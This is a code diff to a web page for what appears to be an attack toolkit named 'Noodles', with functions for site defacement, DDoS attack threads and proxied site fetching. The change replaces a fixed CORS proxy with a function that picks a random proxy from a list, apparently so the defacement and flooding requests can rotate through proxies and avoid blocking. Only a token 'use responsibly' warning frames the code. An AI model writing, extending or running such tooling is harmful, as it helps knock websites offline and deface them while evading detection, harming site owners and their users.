@@ -55,7 +55,7 @@ This section provides access to the Noodles toolkit. Each tool includes detailed
 
   console.log("Backing up site:", url);
   try {
-   const proxyUrl = 'https://api.codetabs.com/v1/proxy/?quest='; // CORS proxy
+   const proxyUrl = await getRandomProxy();
    const response = await fetch(proxyUrl + encodeURIComponent(url));
    if (!response.ok) {
     throw new Error(`HTTP error! status: ${response.status}`);
@@ -116,7 +116,7 @@ This section provides access to the Noodles toolkit. Each tool includes detailed
   console.log("Defacing site:", url);
 
   try {
-   const proxyUrl = 'https://api.codetabs.com/v1/proxy/?quest='; // CORS proxy
+   const proxyUrl = await getRandomProxy();
    const response = await fetch(proxyUrl + encodeURIComponent(url));
 
    if (!response.ok) {
@@ -235,7 +235,7 @@ This section provides access to the Noodles toolkit. Each tool includes detailed
  }
 
  async function ddosAttackThread(url, signal) {
-  const proxyUrl = 'https://api.codetabs.com/v1/proxy/?quest='; // CORS proxy
+  const proxyUrl = await getRandomProxy();
 
   while (isDDoSRunning && !signal.aborted) {
    try {
@@ -417,7 +417,7 @@ This section provides access to the Noodles toolkit. Each tool includes detailed
   console.log("Testing TOR connection to:", url);
 
   try {
-   const corsProxyUrl = 'https://api.codetabs.com/v1/proxy/?quest=';
+   const corsProxyUrl = await getRandomProxy();
    const response = await fetch(corsProxyUrl + url, {
     mode: 'cors',
      headers: {
@@ -626,6 +626,21 @@ The application will include the following security headers:
 
 <script>
  console.warn("NOODLES: Running with best-practice security measures. Use responsibly.");
+
+ async function getRandomProxy() {
+  try {
+   const response = await fetch('/public/main/proxies.json');
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+   const proxies = await response.json();
+   const randomIndex = Math.floor(Math.random() * proxies.length);
+   return proxies[randomIndex];
+  } catch (error) {
+   console.error("Failed to load proxies:", error);
+   return 'https://api.codetabs.com/v1/proxy/?quest='; // Default proxy
+  }
+ }
 </script>
 
 <style>
